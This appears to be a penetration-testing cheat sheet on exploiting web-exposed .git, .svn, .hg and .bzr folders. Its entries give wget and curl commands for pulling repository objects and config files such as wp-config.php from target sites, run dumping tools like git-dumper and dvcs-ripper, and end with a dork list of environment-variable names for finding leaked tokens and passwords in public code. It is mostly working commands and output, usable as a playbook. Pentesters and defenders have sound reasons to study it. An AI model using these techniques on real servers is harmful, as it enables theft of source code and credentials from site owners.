entries.title: Why exposed SCM folders are dangerous
entries.body:
If version control system folders (.git, .svn, .hg, .bzr) are accessible in production, this is critical:
• Source Code Leaks - you can download the entire repository and obtain the application's logic.
• Sensitive Information Exposure - secrets, configs, and credentials are often inside the code.
• Commit History Exposure - the commit history shows what was once exposed and "cleaned up" (but remained in history).

entries.title: Manually checking standard SCM paths
entries.body:
First, manually check the typical paths:
  Git: http://target.com/.git/
  SVN: http://target.com/.svn/
  Mercurial: http://target.com/.hg/
  Bazaar: http://target.com/.bzr/
Look at the HTTP response code and content. You may need to bypass .htaccess rules or a reverse proxy.
Important: for Git a directory listing is not required - the data is extracted as long as the files are readable.

entries.title: NGINX rule that returns 403 instead of 404 on /.git
Which files to check before dumping .git
entries.body:
Dumping .git is possible if these files are readable:
  .git/config
  .git/HEAD
  .git/logs/HEAD
Look for 403 Forbidden or a directory listing to find the /.git/ directory.
Git stores all information in .git/logs/HEAD (also try lowercase head).

entries.title: Example contents of .git/logs/HEAD
entries.body:
0000000000000000000000000000000000000000 15ca375e54f056a576905b41a417b413c57df6eb root <root@dfc2eabdf236.(none)> 1455532500 +0000        clone: from https://github.com/fermayo/hello-world-lamp.git
15ca375e54f056a576905b41a417b413c57df6eb 26e35470d38c4d6815bc4426a862d5399f04865c Michael <michael@easyctf.com> 1489390329 +0000        commit: Initial.
26e35470d38c4d6815bc4426a862d5399f04865c 6b4131bb3b84e9446218359414d636bda782d097 Michael <michael@easyctf.com> 1489390330 +0000        commit: Whoops! Remove flag.
6b4131bb3b84e9446218359414d636bda782d097 a48ee6d6ca840b9130fbaa73bbf55e9e730e4cfd Michael <michael@easyctf.com> 1489390332 +0000        commit: Prevent directory listing.

entries.title: Manually recovering a file by commit hash
entries.body:
# create an empty .git repository
git init test
cd test/.git

# download the file
wget http://web.site/.git/objects/26/e35470d38c4d6815bc4426a862d5399f04865c

# first byte for subdirectory, remaining bytes for filename
mkdir .git/objects/26
mv e35470d38c4d6815bc4426a862d5399f04865c .git/objects/26/

# display the file
git cat-file -p 26e35470d38c4d6815bc4426a862d5399f04865c
    tree 323240a3983045cdc0dec2e88c1358e7998f2e39
    parent 15ca375e54f056a576905b41a417b413c57df6eb
    author Michael <michael@easyctf.com> 1489390329 +0000
    committer Michael <michael@easyctf.com> 1489390329 +0000
    Initial.

entries.title: Reading a tree object
entries.body:
wget http://web.site/.git/objects/32/3240a3983045cdc0dec2e88c1358e7998f2e39
mkdir .git/objects/32
mv 3240a3983045cdc0dec2e88c1358e7998f2e39 .git/objects/32/

git cat-file -p 323240a3983045cdc0dec2e88c1358e7998f2e39
    040000 tree bd083286051cd869ee6485a3046b9935fbd127c0        css
    100644 blob cb6139863967a752f3402b3975e97a84d152fd8f        flag.txt
    040000 tree 14032aabd85b43a058cfc7025dd4fa9dd325ea97        fonts
    100644 blob a7f8a24096d81887483b5f0fa21251a7eefd0db1        index.html
    040000 tree 5df8b56e2ffd07b050d6b6913c72aec44c8f39d8        js

entries.title: Reading file contents (blob)
entries.body:
wget http://web.site/.git/objects/cb/6139863967a752f3402b3975e97a84d152fd8f
mkdir .git/objects/cb
mv 6139863967a752f3402b3975e97a84d152fd8f .git/objects/cb/
git cat-file -p cb6139863967a752f3402b3975e97a84d152fd8f

entries.title: Recovering files from .git/index with gin
entries.body:
# git index file parser: https://pypi.python.org/pypi/gin (python3)
pip3 install gin
gin ~/git-repo/.git/index

entries.title: Extracting file names and sha1 from the index
entries.body:
# recover the name and sha1 of each file from the index, then proceed as with manual recovery
$ gin .git/index | egrep -e "name|sha1"
name = AWS Amazon Bucket S3/README.md
sha1 = 862a3e58d138d6809405aa062249487bee074b98

name = CRLF injection/README.md
sha1 = d7ef4d77741c38b6d3806e0c6a57bf1090eec141

entries.title: git-dumper.py - auto-dump .git
entries.body:
# https://github.com/arthaud/git-dumper
pip install -r requirements.txt
./git-dumper.py http://web.site/.git ~/website

entries.title: diggit.py - downloading an object by hash
entries.body:
# https://github.com/bl4de/security-tools/
# -u — the remote path where the .git folder is located
# -t — the path to a local folder with an empty Git repo where blobs are saved under their real names (cd /path/to/temp/folder && git init)
# -o — the hash of the specific Git object to download
./diggit.py -u remote_git_repo -t temp_folder -o object_hash [-r=True]
./diggit.py -u http://web.site -t /path/to/temp/folder/ -o d60fbeed6db32865a1f01bb9e485755f085f51c1

entries.title: GoGitDumper - auto-dump .git
entries.body:
# https://github.com/c-sto/gogitdumper
go get github.com/c-sto/gogitdumper
gogitdumper -u http://web.site/.git/ -o yourdecideddir/.git/
git log
git checkout

entries.title: rip-git (dvcs-ripper) - dump and read objects
entries.body:
# https://github.com/kost/dvcs-ripper
perl rip-git.pl -v -u "http://web.site/.git/"

git cat-file -p 07603070376d63d911f608120eb4b5489b507692
tree 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2
parent 15ca375e54f056a576905b41a417b413c57df6eb
author Michael <michael@easyctf.com> 1489389105 +0000
committer Michael <michael@easyctf.com> 1489389105 +0000

git cat-file -p 5dae937a49acc7c2668f5bcde2a9fd07fc382fe2

entries.title: GitHack - auto-dump .git
entries.body:
# https://github.com/lijiejie/GitHack
GitHack.py http://web.site/.git/

entries.title: GitTools (gitdumper) - dump and checkout
entries.body:
# https://github.com/internetwache/GitTools
./gitdumper.sh http://target.tld/.git/ /tmp/destdir
git checkout -- .

entries.title: noseyparker - searching for secrets in code and Git history
entries.body:
# https://github.com/praetorian-inc/noseyparker — searches for secrets in text and Git history
git clone https://github.com/trufflesecurity/test_keys
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest scan --datastore datastore.np ./test_keys/
docker run -v "$PWD":/scan ghcr.io/praetorian-inc/noseyparker:latest report --color always
noseyparker scan --datastore np.noseyparker --git-url https://github.com/praetorian-inc/noseyparker
noseyparker scan --datastore np.noseyparker --github-user octocat

entries.title: trufflehog - secrets and entropy in Git history
entries.body:
# searches repositories for high-entropy strings and secrets, digs deep into commit history
pip install truffleHog
truffleHog --regex --entropy=False https://github.com/trufflesecurity/trufflehog.git

entries.title: Yar - searching for secrets across users/orgs repos
entries.body:
# searches for secrets across users'/organizations' repositories (regex, entropy, or both). Inspired by truffleHog
go get github.com/nielsing/yar # https://github.com/nielsing/yar
yar -o orgname --both

entries.title: Gitrob - sensitive files in public repos
entries.body:
# clones a user's/organization's repositories to a given depth, walks the history, and flags files by signatures of potentially sensitive ones
go get github.com/michenriksen/gitrob # https://github.com/michenriksen/gitrob
export GITROB_ACCESS_TOKEN=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef
gitrob [options] target [target2] ... [targetN]

entries.title: Gitleaks - searching for unencrypted secrets
entries.body:
# searching for unencrypted secrets and unwanted data in Git repositories
# public repository
docker run --rm --name=gitleaks zricethezav/gitleaks -v -r https://github.com/zricethezav/gitleaks.git

# local repository, already cloned to /tmp/
docker run --rm --name=gitleaks -v /tmp/:/code/  zricethezav/gitleaks -v --repo-path=/code/gitleaks

# a specific Pull Request on GitHub
docker run --rm --name=gitleaks -e GITHUB_TOKEN={your token} zricethezav/gitleaks --github-pr=https://github.com/owner/repo/pull/9000

entries.title: svn-extractor - extracting resources from .svn
entries.body:
# https://github.com/anantshri/svn-extractor — extracts all web resources via an exposed .SVN folder
python svn-extractor.py --url "url with .svn available"

entries.title: Reading a file directly from text-base
entries.body: curl http://blog.domain.com/.svn/text-base/wp-config.php.svn-base

entries.title: Manual recovery via .svn/wc.db
entries.body:
1. Download the svn database: http://server/path_to_vulnerable_site/.svn/wc.db
   Inside NODES there are rows like:
   INSERT INTO "NODES" VALUES(1,'trunk/test.txt',0,'trunk',1,'trunk/test.txt',2,'normal',NULL,NULL,'file',X'2829',NULL,'$sha1$945a60e68acc693fcb74abadb588aac1a9135f62',NULL,2,1456056344886288,'bl4de',38,1456056261000000,NULL,NULL);

2. Download the files of interest:
   • remove the $sha1$ prefix
   • add the .svn-base suffix
   • the first byte of the hash is the subdirectory inside pristine/ (here 94)
   • the resulting path: http://server/path_to_vulnerable_site/.svn/pristine/94/945a60e68acc693fcb74abadb588aac1a9135f62.svn-base

entries.title: rip-hg.pl (dvcs-ripper) - dump .hg
entries.body:
# https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-hg.pl — ripper for web-accessible SVN/GIT/HG
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-hg.pl -v -u

entries.title: rip-bzr.pl (dvcs-ripper) - dump .bzr
entries.body:
# https://raw.githubusercontent.com/kost/dvcs-ripper/master/rip-bzr.pl
docker run --rm -it -v /path/to/host/work:/work:rw k0st/alpine-dvcs-ripper rip-bzr.pl -v -u

entries.title: bzr_dumper - auto-dump Bazaar
entries.body:
# https://github.com/SeahunOh/bzr_dumper
python3 dumper.py -u "http://127.0.0.1:5000/" -o source
Created a standalone tree (format: 2a)
[!] Target : http://127.0.0.1:5000/
[+] Start.
[+] GET repository/pack-names
[+] GET README
[+] GET checkout/dirstate
[+] GET checkout/views
[+] GET branch/branch.conf
[+] GET branch/format
[+] GET branch/last-revision
[+] GET branch/tag
[+] GET b'154411f0f33adc3ff8cfb3d34209cbd1'
[*] Finish

entries.title: Recovering files via bzr revert
entries.body:
bzr revert
 N  application.py
 N  database.py
 N  static/

entries.title: Dorks for secret leaks in code (env variables)
entries.body:
Environment variable names that often leak secrets in public repos. Search for them (GitHub code search / dorks) as keys next to their values:
GITHUB_TOKEN, GH_TOKEN, GITHUB_ACCESS_TOKEN, GITHUB_API_TOKEN, GITHUB_OAUTH_TOKEN, GITHUB_DEPLOY_TOKEN, NPM_TOKEN, NPM_AUTH_TOKEN, NPM_API_KEY,
DOCKER_PASSWORD, DOCKER_USERNAME, DOCKERHUB_PASSWORD, DOCKER_TOKEN,
AWS_ACCESS_KEY_ID, AWS_SECRET_ACCESS_KEY, AWS_SECRET_KEY, AMAZON_SECRET_ACCESS_KEY, S3_SECRET_KEY, S3_ACCESS_KEY_ID,
HEROKU_API_KEY, FIREBASE_TOKEN, FIREBASE_API_TOKEN, GCLOUD_SERVICE_KEY, DIGITALOCEAN_ACCESS_TOKEN,
SLACK_WEBHOOK_URL, SLACK_CHANNEL, MAILGUN_API_KEY, MG_API_KEY, SENDGRID_API_KEY, TWILIO_API_KEY, TWILIO_ACCOUNT_SID, TWILIO_TOKEN,
DB_USER, DB_PASSWORD, DATABASE_PASSWORD, MYSQL_PASSWORD, MYSQL_USERNAME, MONGOLAB_URI, DATABASE_USER,
FTP_PASSWORD, FTP_USER, FTP_LOGIN, SSHPASS, SSH_PRIVATE_KEY, GPG_PRIVATE_KEY, GPG_PASSPHRASE, LINUX_SIGNING_KEY,
SONATYPE_PASSWORD, SONATYPE_USERNAME, NEXUS_PASSWORD, ARTIFACTORY_KEY, PYPI_PASSWORD, TWINE_PASSWORD, RUBYGEMS_AUTH_TOKEN,
OKTA_CLIENT_TOKEN, AUTH0_CLIENT_SECRET, AUTH0_API_CLIENTSECRET, PAYPAL_CLIENT_SECRET, STRIPE/ACCESS_TOKEN, OAUTH_TOKEN, REFRESH_TOKEN,
SVN_USER, SVN_PASS, GIT_TOKEN, GIT_USER, CYPRESS_RECORD_KEY, SNYK_TOKEN, SONAR_TOKEN, CODECOV_TOKEN, COVERALLS_REPO_TOKEN,
SECRET_KEY_BASE, FLASK_SECRET_KEY, ANSIBLE_VAULT_PASSWORD, VAULT_ADDR, VAULT_APPROLE_SECRET_ID, PASSWORD, USERNAME, API_KEY, API_SECRET, ACCESS_TOKEN, CLIENT_SECRET.
The full list (~1400 keys) - Files/github-dorks.txt in PayloadsAllTheThings; use it as a wordlist for automated searching.
